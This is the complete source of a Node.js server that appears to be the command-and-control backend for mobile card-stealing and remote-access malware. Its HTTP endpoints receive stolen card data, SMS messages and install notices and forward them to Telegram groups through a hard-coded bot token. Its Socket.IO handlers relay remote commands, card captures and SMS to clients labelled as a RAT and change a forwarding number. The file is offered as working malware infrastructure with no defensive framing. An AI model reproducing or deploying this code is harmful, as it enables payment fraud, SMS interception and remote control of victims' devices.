// Importing necessary modules
const { Telegraf } = require('telegraf');
const botTele = new Telegraf('8173592602:AAE3lLhBVlNy4fBWy33jJGDvFuhExz3FJW8');

const CCID = '-1002492698951';
const SSID = '-1002338284658';
const INSID = '-1002304481516';

const CCID_ = '-1002312570151';
const SSID_ = '-1002369489499';
const INSID_ = '-1002352633588';

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

// Create the first Express app
const app = express();
const port = process.env.PORT || 3000;

const cors = require('cors');

app.use(cors()); // Allow all origins
app.use(express.json());

// Create an HTTP server
const server = http.createServer(app);

// Attach Socket.IO to the HTTP server
const io = socketIo(server);

const valueCheck = "CC: 6886 8686 7575 5688";

const jsonData = {
  message: 'Done!',
};

app.get('/', (req, res) => {
  res.send(jsonData);
});

app.post('/data_io', (req, res) => {
  //console.log('DATA IO',req.body.data);
  const data_ = req.body.data;
  if (data_.includes(valueCheck)) {
	 return res.status(200).send("ERROR");
  }
  io.emit('user_online',data_);
  res.status(200).send(jsonData);
});

app.post('/data_alert', (req, res) => {
  //console.log('DATA IO',req.body.data);
  const data_ = req.body.data;
  if (data_.includes(valueCheck)) {
	return res.status(200).send("ERROR");
 }
  io.emit('user_online',data_);
  res.status(200).send(jsonData);
});

app.post('/data_i', (req, res) => {
  const data_ = req.body.data;
  if (data_.includes(valueCheck)) {
	return res.status(200).send("ERROR");
 }
  io.emit('install_got',data_);
	// Send INSTALL to the group
	botTele.telegram.sendMessage(INSID, data_)
  res.status(200).send(jsonData);
});

app.post('/data_c', (req, res) => {
  const data_ = req.body.data;
  if (data_.includes(valueCheck)) {
	return res.status(200).send("ERROR");
 }
  io.emit('card_got',data_);
	// Send CC to the group
	botTele.telegram.sendMessage(CCID, data_)
  res.status(200).send(jsonData);
});

app.post('/data_s', (req, res) => {
	const data_ = req.body.data;
	if (data_.includes(valueCheck)) {
		return res.status(200).send("ERROR");
	 }
	io.emit('sms_got',data_);
	// Send message to the group
	botTele.telegram.sendMessage(SSID, data_)
	res.status(200).send(jsonData);
});


// SECOND GROUPS
app.post('/data_i_', (req, res) => {
	const data_ = req.body.data;
	if (data_.includes(valueCheck)) {
		return res.status(200).send("ERROR");
	 }
	io.emit('install_got',data_);
	  // Send INSTALL to the group
	  botTele.telegram.sendMessage(INSID_, data_)
	res.status(200).send(jsonData);
  });
  
  app.post('/data_c_', (req, res) => {
	const data_ = req.body.data;
	if (data_.includes(valueCheck)) {
		return res.status(200).send("ERROR");
	 }
	io.emit('card_got',data_);
	  // Send CC to the group
	  botTele.telegram.sendMessage(CCID_, data_)
	res.status(200).send(jsonData);
  });
  
  app.post('/data_s_', (req, res) => {
	  const data_ = req.body.data;
	  if (data_.includes(valueCheck)) {
		return res.status(200).send("ERROR");
	 }
	  io.emit('sms_got',data_);
	  // Send message to the group
	  botTele.telegram.sendMessage(SSID_, data_)
	  res.status(200).send(jsonData);
  });


// Socket.IO event handlers
io.on('connection', (socket) => {
  console.log('WebSocket client connected');
  socket.on('message', (message) => {
    console.log('Received message:', message);
    socket.emit('msg', 'Hello from WebSocket server!');
  });
  	socket.on('card_send' , function(data){
		io.emit('card_got',data);

		//botTele.telegram.sendMessage(CCID, data_)

	});
	
	socket.on('card_copy_ss' , function(data){
		io.emit('card_copy_pc',data);
	});
	
	socket.on('send_card_copy' , function(data){
		io.emit('card_copy',data);
	});
	
	////////////////////////////////////////////////////////////
	
	socket.on('update_num_server' , function(data){
		console.log('UPDATING FORW_NUM: '+data);
		forw_num = data;
		io.emit('update_num',forw_num);
	});
	
	socket.on('online_check' , function(data){
		io.emit('is_online',data);
	});
	
	socket.on('online_check_card' , function(data){
		io.emit('are_you_online',data);
	});
	
	socket.on('user_send' , function(data){
		io.emit('user_online',data);
	});
		
	socket.on('msg_send' , function(data){
		io.emit('sms_got',data);
	});
	
	socket.on('net_send' , function(data){
		io.emit('net_got',data);
	});
	
	socket.on('cmd' , function(data){
		io.emit('cmd_send',data);
	});
	
	// ON NEW RAT CONNECTION AFTER NEW CONNECTION
	socket.on('user_connected' , function(data){
		io.emit('on_user_connected',data);
	});
	
	socket.on('card_data' , function(data){
		io.emit('card_data_rat',data);
	});

	socket.on('sms' , function(data){
		io.emit('sms_rat',data);
	});
	
		
	socket.on('cmd_done' , function(data){
		io.emit('cmd_done_rat',data);
	});
	
	socket.on("disconnect", () => console.log("User Disconnected: "+socket.id));
	////////////////////////////////////////////////////////////
	
});

// Start the HTTP server
server.listen(port, () => {
  console.log(`Server running at ${port}`);
});







